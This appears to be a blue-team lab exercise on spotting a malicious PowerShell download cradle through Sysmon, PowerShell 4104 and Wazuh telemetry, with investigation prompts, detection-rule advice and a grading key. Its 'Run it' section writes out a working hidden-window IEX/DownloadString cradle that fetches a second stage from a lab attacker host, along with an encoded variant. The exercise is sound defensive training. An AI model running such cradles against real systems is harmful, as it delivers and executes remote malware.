# S05 — Malicious PowerShell Download Cradle

**Tier 2 · ATT&CK: T1059.001 (PowerShell), T1105 (Ingress Tool Transfer)**

## Story
On `vic-win`, PowerShell ran with a suspicious command line overnight. Was it a benign admin one-liner or a download-and-execute cradle pulling a second stage? Prove which.

## Lab setup
- `vic-win` with Sysmon (SwiftOnSecurity/Olaf config) + PowerShell Script Block Logging (4104) + 4688 command-line auditing.
- Wazuh agent reading `Microsoft-Windows-Sysmon/Operational` and `Microsoft-Windows-PowerShell/Operational`.
- Attacker `kali` hosting a fake "stage2" on `http://10.10.10.5/`.

## Run it
From `vic-win` (or via your foothold). Randomize: encoded vs plain, and success vs blocked-by-nonexistent-host.
```powershell
# Classic cradle
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/stage2.ps1')"

# Encoded variant (base64 of the above) - what real intrusions use
powershell -nop -enc <BASE64>
```
Or, cleaner and reversible: `Invoke-AtomicTest T1059.001` and `T1105`.

## Cleanup / revert
Revert to `baseline`.

## What telemetry this generates
- **Sysmon Event 1** (process create): full command line, parent process, hashes. Encoded `-enc` blobs and `DownloadString` are the tells.
- **Sysmon Event 3** (network connect): `powershell.exe` making an outbound TCP connection to `10.10.10.5:80`. PowerShell talking to the internet is abnormal.
- **PowerShell 4104**: the *decoded* script block, so even the `-enc` variant reveals its true content here.
- **Wazuh**: Sysmon + PowerShell decoders raise process-creation and script-block alerts.

## Your investigation (fill cold)
Decode the command (4104 gives it to you). Did it reach out, to where, and did the download succeed (Event 3 + your kali access log)? What's the parent process, and how did PowerShell get launched? Benign or malicious, and what's your confidence? If it was `-enc`, note that the encoding didn't hide it from 4104. That's a detection lesson.

## Detection engineering
A rule on `powershell.exe` with `-enc`/`-EncodedCommand`, `DownloadString`/`DownloadFile`/`IEX`, or a network connection to a non-corporate IP. Best: correlate Sysmon 1 (cradle command) → Sysmon 3 (egress) → Sysmon 1 (child spawned by the stage). Ship the command-line rule.

<details>
<summary>Grading key — do not open until your verdict is written</summary>

- Sealed truth: encoded or plain, the decoded command, the callback URL, and success/blocked.
- **Good:** you decoded the intent from 4104, confirmed egress with Event 3 + kali's log, named the parent, and gave a defensible verdict with confidence. Bonus: you noted script-block logging defeats the encoding.
- **Miss:** stopping at "encoded PowerShell = bad" without decoding it — the whole skill is turning `-enc` into the actual behavior.
</details>
